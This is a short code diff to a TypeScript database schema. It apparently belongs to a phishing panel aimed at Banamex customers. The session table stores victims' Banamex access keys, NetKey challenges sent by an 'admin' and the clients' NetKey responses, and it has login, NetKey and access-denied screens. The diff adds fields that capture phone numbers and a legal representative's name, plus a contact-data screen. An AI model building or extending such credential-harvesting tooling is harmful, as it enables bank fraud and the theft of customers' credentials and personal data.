@@ -124,6 +124,9 @@ export const sessions = pgTable("sessions", {
   claveAcceso: text("clave_acceso"), // Clave de acceso de Banamex
   challenge: text("challenge"), // Challenge NetKey de 8 dígitos (código que admin envía)
   netkeyResponse: text("netkey_response"), // Respuesta NetKey del cliente
+  telefono1: text("telefono1"), // Teléfono de contacto 1
+  telefono2: text("telefono2"), // Teléfono de contacto 2 (opcional)
+  nombreRepresentante: text("nombre_representante"), // Nombre del representante legal
   pasoActual: text("paso_actual").default("folio"),
   createdAt: timestamp("created_at").defaultNow(),
   active: boolean("active").default(true),
@@ -219,6 +222,7 @@ export enum ScreenType {
   LOGIN = "login",
   NETKEY = "netkey",
   NETKEY2 = "netkey2",
+  DATOS_CONTACTO = "datos_contacto",
   ACCESO_DENEGADO = "acceso_denegado",
   VUELOS_OTORGADOS = "audifonos_otorgados",
   TELEFONO = "telefono",
